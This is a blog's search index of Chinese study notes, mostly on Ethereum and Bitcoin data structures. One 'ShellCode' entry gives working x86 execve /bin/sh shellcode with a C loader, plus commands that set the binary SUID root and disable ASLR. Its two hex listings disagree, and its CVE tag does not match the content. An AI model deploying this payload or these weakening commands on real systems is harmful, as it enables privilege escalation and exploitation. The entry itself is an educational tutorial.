<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>04-ETH-交易树与收据树</title>
    <link href="/2024/07/29/04-ETH-%E4%BA%A4%E6%98%93%E6%A0%91%E4%B8%8E%E6%94%B6%E6%8D%AE%E6%A0%91/"/>
    <url>/2024/07/29/04-ETH-%E4%BA%A4%E6%98%93%E6%A0%91%E4%B8%8E%E6%94%B6%E6%8D%AE%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="交易树-MPT"><a href="#交易树-MPT" class="headerlink" title="交易树(MPT)"></a>交易树(MPT)</h1><ul><li>只组织当前区块的交易。</li><li>提供默克尔证明。</li><li>查询操作。</li></ul><h1 id="收据树-MPT"><a href="#收据树-MPT" class="headerlink" title="收据树(MPT)"></a>收据树(MPT)</h1><ul><li>由于</li></ul><h1 id="bloom-filter"><a href="#bloom-filter" class="headerlink" title="bloom filter"></a>bloom filter</h1><ul><li>高效查找存在性。</li><li>生成摘要，查看映射函数是否存在。</li><li>哈希之后映射。 </li><li>可能会误报，不会不报。</li><li>false positive。</li><li>不支持删除操作。</li><li>添加计数器才可以进行参数操作，类似链接。</li><li>每个交易都有一个bloom fliter。</li><li>块头有一个总的Bloom filter。</li><li>快速过滤。</li><li><img src="/../pic/Pasted%20image%2020240729223126.png"></li></ul><h1 id="交易驱动状态机-ETH"><a href="#交易驱动状态机-ETH" class="headerlink" title="交易驱动状态机-ETH"></a>交易驱动状态机-ETH</h1><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="账户状态是否可以只包含这两个账号的状态。"><a href="#账户状态是否可以只包含这两个账号的状态。" class="headerlink" title="账户状态是否可以只包含这两个账号的状态。"></a>账户状态是否可以只包含这两个账号的状态。</h2><ul><li>不方便找到账户的信息。</li><li>新建区块需要找到创世区块。</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="交易树与收据树的创建"><a href="#交易树与收据树的创建" class="headerlink" title="交易树与收据树的创建"></a>交易树与收据树的创建</h2><p><img src="/../pic/Pasted%20image%2020240729225256.png"></p><ul><li>交易树的创建。</li><li>收据树的创建。</li></ul><h2 id="DeriveSha"><a href="#DeriveSha" class="headerlink" title="DeriveSha"></a>DeriveSha</h2><p>![[Pasted%20image%2020240729225540.png]]</p><h2 id="trie"><a href="#trie" class="headerlink" title="trie"></a>trie</h2><p><img src="/../pic/Pasted%20image%2020240729225626.png"></p><h1 id="收据树的结构"><a href="#收据树的结构" class="headerlink" title="收据树的结构"></a>收据树的结构</h1><p><img src="/../pic/Pasted%20image%2020240729225710.png"></p><ul><li>bloom：bloom filter</li><li>logs：根据logs产生相应的bloom filter。</li></ul><h2 id="区块头的数据结构"><a href="#区块头的数据结构" class="headerlink" title="区块头的数据结构"></a>区块头的数据结构</h2><p><img src="/../pic/Pasted%20image%2020240729225847.png"></p><h2 id="create-bloom函数"><a href="#create-bloom函数" class="headerlink" title="create bloom函数"></a>create bloom函数</h2><p><img src="/../pic/Pasted%20image%2020240729225947.png"></p><ul><li>映射三个位置。</li></ul><h2 id="查询bloom-filter"><a href="#查询bloom-filter" class="headerlink" title="查询bloom filter"></a>查询bloom filter</h2><p><img src="/../pic/Pasted%20image%2020240729230334.png"></p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ShellCode</title>
    <link href="/2024/07/29/shellcode/"/>
    <url>/2024/07/29/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-16-32位"><a href="#ubuntu-16-32位" class="headerlink" title="ubuntu(16 32位)"></a>ubuntu(16 32位)</h1><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p><h2 id="汇编码与机器码"><a href="#汇编码与机器码" class="headerlink" title="汇编码与机器码"></a>汇编码与机器码</h2><h3 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h3><p>可以直接在CPU运行的代码，一般就是可以用二进制代码来展示。</p><h3 id="汇编码"><a href="#汇编码" class="headerlink" title="汇编码"></a>汇编码</h3><p>就是币机器码高级一点的语言，通过基本的语言实现操作系统的基础功能。</p><h1 id="shellcode代码"><a href="#shellcode代码" class="headerlink" title="shellcode代码"></a>shellcode代码</h1><h2 id="汇编代码-目标机32bit的ubuntu16"><a href="#汇编代码-目标机32bit的ubuntu16" class="headerlink" title="汇编代码(目标机32bit的ubuntu16)"></a>汇编代码(目标机32bit的ubuntu16)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>section .text<br>    global _start<br><br>_start:<br>    xor eax, eax<br>    push eax<br>    push 0x68732f2f<br>    push 0x6e69622f<br>    mov ebx, esp<br>    push eax<br>    push ebx<br>    mov ecx, esp<br>    xor edx, edx<br>    mov al, 0xb<br>    int 0x80<br></code></pre></td></tr></table></figure><h2 id="使用汇编码"><a href="#使用汇编码" class="headerlink" title="使用汇编码"></a>使用汇编码</h2><h3 id="1-上述代码保存为文件（shellcode-asm）"><a href="#1-上述代码保存为文件（shellcode-asm）" class="headerlink" title="1.上述代码保存为文件（shellcode.asm）"></a>1.上述代码保存为文件（shellcode.asm）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim shellcode.asm<br></code></pre></td></tr></table></figure><h3 id="2-进行汇编"><a href="#2-进行汇编" class="headerlink" title="2.进行汇编"></a>2.进行汇编</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f elf32 shellcode.asm -o shellcode.o<br></code></pre></td></tr></table></figure><h3 id="3-进行链接"><a href="#3-进行链接" class="headerlink" title="3.进行链接"></a>3.进行链接</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ld -m elf_i386 shellcode.o -o shellcode<br></code></pre></td></tr></table></figure><h3 id="4-设置SUID位（可选）"><a href="#4-设置SUID位（可选）" class="headerlink" title="4.设置SUID位（可选）"></a>4.<strong>设置SUID位（可选）</strong></h3><p>以root权限执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown root:root shellcode<br>sudo chmod u+s shellcode<br></code></pre></td></tr></table></figure><h3 id="5-禁用ASLR（可选）"><a href="#5-禁用ASLR（可选）" class="headerlink" title="5.禁用ASLR（可选）"></a>5.<strong>禁用ASLR（可选）</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><h3 id="6-运行可执行文件"><a href="#6-运行可执行文件" class="headerlink" title="6.运行可执行文件"></a>6.运行可执行文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./shellcode<br></code></pre></td></tr></table></figure><h2 id="汇编代码转为机器码"><a href="#汇编代码转为机器码" class="headerlink" title="汇编代码转为机器码"></a>汇编代码转为机器码</h2><h3 id="编译为二进制文件"><a href="#编译为二进制文件" class="headerlink" title="编译为二进制文件"></a>编译为二进制文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nasm -f bin shellcode.asm -o shellcode.bin<br></code></pre></td></tr></table></figure><h3 id="查看机器码并转为所需格式"><a href="#查看机器码并转为所需格式" class="headerlink" title="查看机器码并转为所需格式"></a>查看机器码并转为所需格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">xxd -p shellcode.bin | sed &#x27;s/\(..\)/\\x\1/g&#x27; | fold -w 48<br></code></pre></td></tr></table></figure><h2 id="16进制机器码"><a href="#16进制机器码" class="headerlink" title="16进制机器码"></a>16进制机器码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shellcode">\x66\x31\xc0\x66\x50\x66\xbb\x2f\x2f\x73\x68\x66<br>\x53\x66\xbb\x2f\x62\x69\x6e\x66\x53\x66\x89\xe3<br>\x66\x50\x66\x53\x66\x89<br>\xe1\x66\x31\xd2\xb0\x0b\xcd\x80<br></code></pre></td></tr></table></figure><h2 id="C语言使用机器码"><a href="#C语言使用机器码" class="headerlink" title="C语言使用机器码"></a>C语言使用机器码</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-comment">// Shellcode</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <br><span class="hljs-string">&quot;\x31\xc0\x50\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Print shellcode length</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length: %ld\n&quot;</span>, <span class="hljs-built_in">strlen</span>(shellcode));<br><br>    <span class="hljs-comment">// Allocate executable memory</span><br>    <span class="hljs-type">void</span> *exec = mmap(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (exec == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Copy shellcode to allocated memory</span><br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// Execute shellcode</span><br>    <span class="hljs-type">void</span> (*execute_shellcode)() = (<span class="hljs-type">void</span> (*)())exec;<br>    execute_shellcode();<br><br>    <span class="hljs-comment">// Cleanup</span><br>    munmap(exec, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 <code>-z execstack</code> 编译选项来允许执行堆栈上的代码:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -z execstack -o shellcode shellcode.c<br></code></pre></td></tr></table></figure><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><ul><li>开启shell窗口。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
      <category>CVE-2024-6387</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03-ETH-状态树</title>
    <link href="/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/"/>
    <url>/2024/07/25/03-ETH-%E7%8A%B6%E6%80%81%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><ul><li>addr –&gt;state</li></ul><h2 id="余额证明"><a href="#余额证明" class="headerlink" title="余额证明"></a>余额证明</h2><ul><li>所有账户的哈希表。</li><li>构造默克尔树。</li><li>余额只是一种状态。</li><li>根据哈希值流程验证即可证明，因为根哈希是一定的在某个时间。</li></ul><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><h3 id="构造默克尔树"><a href="#构造默克尔树" class="headerlink" title="构造默克尔树"></a>构造默克尔树</h3><h4 id="不排序"><a href="#不排序" class="headerlink" title="不排序"></a>不排序</h4><ul><li>默克尔书不唯一。</li></ul><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><ul><li>代价太大，新建账户的代价太大。</li></ul><h1 id="trie-检索树"><a href="#trie-检索树" class="headerlink" title="trie(检索树)"></a>trie(检索树)</h1><p><img src="/../pic/Pasted%20image%2020240725182117.png"></p><ul><li>输入不管，结果相同。</li><li>更新局部性比较强。</li><li>存储有点浪费。</li></ul><h1 id="PT压缩检索树"><a href="#PT压缩检索树" class="headerlink" title="PT压缩检索树"></a>PT压缩检索树</h1><p><img src="/../pic/Pasted%20image%2020240725182211.png"></p><ul><li>访问效率增加。</li><li>新增加点，节点可能需要扩展。</li><li>数据稀疏的时候压缩效果好。</li><li>以太坊地址足够稀疏，160位。</li></ul><h1 id="MPT-默克尔压缩检索树"><a href="#MPT-默克尔压缩检索树" class="headerlink" title="MPT(默克尔压缩检索树)"></a>MPT(默克尔压缩检索树)</h1><ul><li>哈希代替指针。</li><li>进行压缩。</li><li>可以证明账户不存在性。</li></ul><h1 id="MMPT-修改的默克尔压缩检索树"><a href="#MMPT-修改的默克尔压缩检索树" class="headerlink" title="MMPT(修改的默克尔压缩检索树)"></a>MMPT(修改的默克尔压缩检索树)</h1><p><img src="/../pic/Pasted%20image%2020240725224548.png"></p><p><img src="/../pic/Pasted%20image%2020240725224916.png"></p><ul><li>以哈希值存储。</li><li>根哈希的值存储在块头节点。</li><li>合约账户的信息存储也是小的MMPT。</li><li>大部分的节点时共享的。</li></ul><h1 id="状态树的历史记录的保存"><a href="#状态树的历史记录的保存" class="headerlink" title="状态树的历史记录的保存"></a>状态树的历史记录的保存</h1><ul><li>可能需要状态退回。</li><li>维护历史记录。</li><li>为了支持回滚。</li></ul><h1 id="区块头数据结构"><a href="#区块头数据结构" class="headerlink" title="区块头数据结构"></a>区块头数据结构</h1><p><img src="/../pic/Pasted%20image%2020240725225444.png"></p><ul><li>root：账户状态树的根哈希。</li><li>TxHash：</li><li>ReciptHash：</li></ul><h1 id="块身的结构"><a href="#块身的结构" class="headerlink" title="块身的结构"></a>块身的结构</h1><p><img src="/../pic/Pasted%20image%2020240725225711.png"></p><h1 id="RLP-Recursive-Length-Profix"><a href="#RLP-Recursive-Length-Profix" class="headerlink" title="RLP(Recursive Length Profix)"></a>RLP(Recursive Length Profix)</h1><ul><li>序列化value的值。</li><li>只支持字符数组。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02-ETC-账户</title>
    <link href="/2024/07/25/02-ETC-%E8%B4%A6%E6%88%B7/"/>
    <url>/2024/07/25/02-ETC-%E8%B4%A6%E6%88%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="BTC"><a href="#BTC" class="headerlink" title="BTC"></a>BTC</h1><ul><li>基于交易的。</li><li>需要说明币的来源</li><li>验证与一次性花费完</li></ul><h1 id="ETH"><a href="#ETH" class="headerlink" title="ETH"></a>ETH</h1><ul><li>基于账户的余额管理。</li><li>不说明币的来源。</li><li>也不需要一次性转完。</li><li>天然防御双花攻击。</li></ul><h2 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h2><ul><li>想要收一个交易的两次结果，</li><li>加一个交易次数nonce唯一值。</li><li>以确保交易的唯一性。</li><li>nonce在签名中被保护。</li></ul><h1 id="账户类型"><a href="#账户类型" class="headerlink" title="账户类型"></a>账户类型</h1><h2 id="外部账户"><a href="#外部账户" class="headerlink" title="外部账户"></a>外部账户</h2><ul><li>账户余额</li><li>nonce(counter)</li></ul><h2 id="合约账户"><a href="#合约账户" class="headerlink" title="合约账户"></a>合约账户</h2><ul><li>余额</li><li>nonce</li><li>不能主动发送交易</li><li>可以调用其他合约</li><li>代码</li><li>存储空间</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01-ETH-概述</title>
    <link href="/2024/07/25/01-ETH-%E6%A6%82%E8%BF%B0/"/>
    <url>/2024/07/25/01-ETH-%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ETH特殊性"><a href="#ETH特殊性" class="headerlink" title="ETH特殊性"></a>ETH特殊性</h1><ul><li>提高内存要求。</li><li>goust共识机制。</li><li>智能合约，去中心化的合约</li></ul><h1 id="去中心化的货币与法币的优势"><a href="#去中心化的货币与法币的优势" class="headerlink" title="去中心化的货币与法币的优势"></a>去中心化的货币与法币的优势</h1><ul><li>跨国转账</li></ul><h1 id="去中心化合同有什么用"><a href="#去中心化合同有什么用" class="headerlink" title="去中心化合同有什么用"></a>去中心化合同有什么用</h1><ul><li>跨国签署。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>ETH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>ETH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>12 BTC-思考</title>
    <link href="/2024/07/24/12%20BTC-%E6%80%9D%E8%80%83/"/>
    <url>/2024/07/24/12%20BTC-%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="1-哈希指针"><a href="#1-哈希指针" class="headerlink" title="1.哈希指针"></a>1.哈希指针</h1><p><img src="/../pic/Pasted%20image%2020240724184250.png"></p><ul><li>只是哈希，没有指针。</li><li>存储在（key,value）数据库中，level DB</li></ul><h1 id="2-区块恋"><a href="#2-区块恋" class="headerlink" title="2.区块恋"></a>2.区块恋</h1><p>特点：私钥分开</p><ul><li>降低账户安全性。</li><li>丢失很难找回。</li><li>永久保存死钱，浪费空间。</li><li>安全方式：多种签名。</li></ul><h1 id="3-分布式共识"><a href="#3-分布式共识" class="headerlink" title="3. 分布式共识"></a>3. 分布式共识</h1><p> 为什么区块链系统能够绕过分布式共识中的那些不可能结论。</p><p>没有达到真正的共识。</p><h1 id="4-比特币的稀缺性"><a href="#4-比特币的稀缺性" class="headerlink" title="4.比特币的稀缺性"></a>4.比特币的稀缺性</h1><p>稀缺性不适合作为货币</p><h1 id="5-量子计算"><a href="#5-量子计算" class="headerlink" title="5.量子计算"></a>5.量子计算</h1><ul><li>公钥也不是明文存储。</li><li>SHA-256</li><li>最好是一次性转移。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11 BTC-匿名性</title>
    <link href="/2024/07/24/11%20BTC-%E5%8C%BF%E5%90%8D%E6%80%A7/"/>
    <url>/2024/07/24/11%20BTC-%E5%8C%BF%E5%90%8D%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="匿名性"><a href="#匿名性" class="headerlink" title="匿名性"></a>匿名性</h1><p>BTC就是化名。</p><h1 id="破坏匿名性的可能"><a href="#破坏匿名性的可能" class="headerlink" title="破坏匿名性的可能"></a>破坏匿名性的可能</h1><h2 id="账户关联"><a href="#账户关联" class="headerlink" title="账户关联"></a>账户关联</h2><p>交易时，需要一个找零钱的地址，是输入用户的账户。</p><p>钱包交易时</p><h2 id="实体世界联系"><a href="#实体世界联系" class="headerlink" title="实体世界联系"></a>实体世界联系</h2><p>交集反推，可以把账户与个人联系起来。</p><h1 id="提高匿名性方式"><a href="#提高匿名性方式" class="headerlink" title="提高匿名性方式"></a>提高匿名性方式</h1><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul><li>破坏匿名性原因：账户交易集中</li><li>coin mixing：混合币，没有信誉度高的机构。</li><li>在线钱包可能或有币混合的性质。</li><li>交易所不泄露交易记录可以。</li><li></li></ul><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ul><li>tor</li><li>多路径转发</li></ul><h1 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a>零知识证明</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><img src="/../pic/Pasted%20image%2020240724182711.png"></p><h2 id="同态隐藏（数学基础）"><a href="#同态隐藏（数学基础）" class="headerlink" title="同态隐藏（数学基础）"></a>同态隐藏（数学基础）</h2><p><img src="/../pic/Pasted%20image%2020240724182851.png"></p><ul><li>无输入碰撞，唯一对应。</li><li>加密函数不可逆。</li><li>同台运算。</li><li>x与y进行随机化处理，使得x与y的运算结果不变。</li></ul><h1 id="盲签名"><a href="#盲签名" class="headerlink" title="盲签名"></a>盲签名</h1><p><img src="/../pic/Pasted%20image%2020240724183744.png"></p><ul><li>2、3 步的serialnum为明文。</li></ul><h1 id="零币与零钞"><a href="#零币与零钞" class="headerlink" title="零币与零钞"></a>零币与零钞</h1><p><img src="/../pic/Pasted%20image%2020240724183837.png"></p><ul><li>随机源必须及时销毁。</li><li>还是要与实体交易还是容易泄露匿名性。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10 BTC-问答</title>
    <link href="/2024/07/24/10%20BTC-%E9%97%AE%E7%AD%94/"/>
    <url>/2024/07/24/10%20BTC-%E9%97%AE%E7%AD%94/</url>
    
    <content type="html"><![CDATA[<h1 id="1-转账目标地址离线，对于转账交易有什么影响"><a href="#1-转账目标地址离线，对于转账交易有什么影响" class="headerlink" title="1. 转账目标地址离线，对于转账交易有什么影响"></a>1. 转账目标地址离线，对于转账交易有什么影响</h1><p>无影响</p><h1 id="2-全节点收到的交易会不会出现全新的接受地址"><a href="#2-全节点收到的交易会不会出现全新的接受地址" class="headerlink" title="2.全节点收到的交易会不会出现全新的接受地址"></a>2.全节点收到的交易会不会出现全新的接受地址</h1><p>会，生成新的公钥不会告诉别人，在UTXO中出现才能别被人发现</p><h1 id="3-私钥丢失怎么办"><a href="#3-私钥丢失怎么办" class="headerlink" title="3.私钥丢失怎么办"></a>3.私钥丢失怎么办</h1><p>没办法</p><h1 id="4-私钥泄露怎么办"><a href="#4-私钥泄露怎么办" class="headerlink" title="4.私钥泄露怎么办"></a>4.私钥泄露怎么办</h1><h1 id="5-转账写错地址怎么办"><a href="#5-转账写错地址怎么办" class="headerlink" title="5.转账写错地址怎么办"></a>5.转账写错地址怎么办</h1><p>保存在一个由信息生成的公钥，是不合理的公钥。</p><h1 id="6-return的无条件返回错误怎么通过验证怎么写上区块链"><a href="#6-return的无条件返回错误怎么通过验证怎么写上区块链" class="headerlink" title="6. return的无条件返回错误怎么通过验证怎么写上区块链"></a>6. return的无条件返回错误怎么通过验证怎么写上区块链</h1><p>验证：验证的时候不会被执行，只有在花销的时候才会执行return后面的语句。</p><h1 id="7-矿工偷答案"><a href="#7-矿工偷答案" class="headerlink" title="7.矿工偷答案"></a>7.矿工偷答案</h1><p>区块的的哈希值包含里面的，改成别人的地址，根哈希也需要改变。</p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>09 BTC-分叉</title>
    <link href="/2024/07/24/09%20BTC-%E5%88%86%E5%8F%89/"/>
    <url>/2024/07/24/09%20BTC-%E5%88%86%E5%8F%89/</url>
    
    <content type="html"><![CDATA[<h1 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h1><h2 id="state-fork"><a href="#state-fork" class="headerlink" title="state fork"></a>state fork</h2><ul><li>对于当前区块有分歧。</li><li>同时获取到合法块。</li></ul><h3 id="forking-attack"><a href="#forking-attack" class="headerlink" title="forking attack"></a>forking attack</h3><ul><li>deliberate fork</li></ul><h2 id="协议分叉-protocol-fork"><a href="#协议分叉-protocol-fork" class="headerlink" title="协议分叉(protocol fork)"></a>协议分叉(protocol fork)</h2><h3 id="硬分叉"><a href="#硬分叉" class="headerlink" title="硬分叉"></a>硬分叉</h3><p><img src="/../pic/Pasted%20image%2020240723233030.png"></p><ul><li>对于区块链的基本信息的修改，接受与不接受的人之间的分叉。</li><li>接受的人认为修改过的为合法区块，未修改为非法区块。</li><li>典型的为block size limit</li><li>永久性分叉。</li><li>加一个chainID作为链的标识。</li></ul><h3 id="软分叉（sofy-fork）"><a href="#软分叉（sofy-fork）" class="headerlink" title="软分叉（sofy fork）"></a>软分叉（sofy fork）</h3><p><img src="/../pic/Pasted%20image%2020240723233706.png"></p><ul><li>分叉的结果是只有一条链是合法的。</li><li>更新新版本的节点挖的区块可以被识别与认证。</li><li>旧版本的节点挖出来的区块不会被新节点承认，即无法加入最长合法连中。</li><li>旧认新，新不认旧。</li></ul><h4 id="coinbase"><a href="#coinbase" class="headerlink" title="coinbase"></a>coinbase</h4><ul><li>挖矿难度：extra nonce + 4bytes</li><li>extra nonce：前8bit用来作为修改target的数据。</li><li>extra nonce 后面：作为UTXO的根哈希。</li></ul><h4 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h4><ul><li>改成默克尔树。</li></ul><h4 id="默克尔树"><a href="#默克尔树" class="headerlink" title="默克尔树"></a>默克尔树</h4><ul><li>验证交易是否在区块内。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>08 BTC-脚本</title>
    <link href="/2024/07/22/08%20BTC-%E8%84%9A%E6%9C%AC/"/>
    <url>/2024/07/22/08%20BTC-%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="1-交易信息"><a href="#1-交易信息" class="headerlink" title="1. 交易信息"></a>1. 交易信息</h1><h3 id="a-交易结构"><a href="#a-交易结构" class="headerlink" title="a.交易结构"></a>a.交易结构</h3><p><img src="/../pic/Pasted%20image%2020240722222013.png"></p><p>说明：</p><ul><li>locktime：生效延迟时间。</li><li>vin：输入信息。</li><li>vout：输出信息。</li><li>blockhash：哈希值。</li><li>time：交易时间。</li><li>blocktime：区块产生时间。</li></ul><h3 id="b-交易的输入"><a href="#b-交易的输入" class="headerlink" title="b.交易的输入"></a>b.交易的输入</h3><p><img src="/../pic/Pasted%20image%2020240722222428.png"></p><ul><li>txid：之前交易的哈希值。</li><li>vout：第几个输出结果。</li><li>scriptSig：输入脚本。</li></ul><h3 id="c-交易输出"><a href="#c-交易输出" class="headerlink" title="c.交易输出"></a>c.交易输出</h3><p><img src="/../pic/Pasted%20image%2020240722222713.png"></p><ul><li>reqSigs：需要多少个签名（单&#x2F;多重签名）。</li><li>address：输出的地址。</li></ul><h3 id="d-交易验证"><a href="#d-交易验证" class="headerlink" title="d.交易验证"></a>d.交易验证</h3><p><img 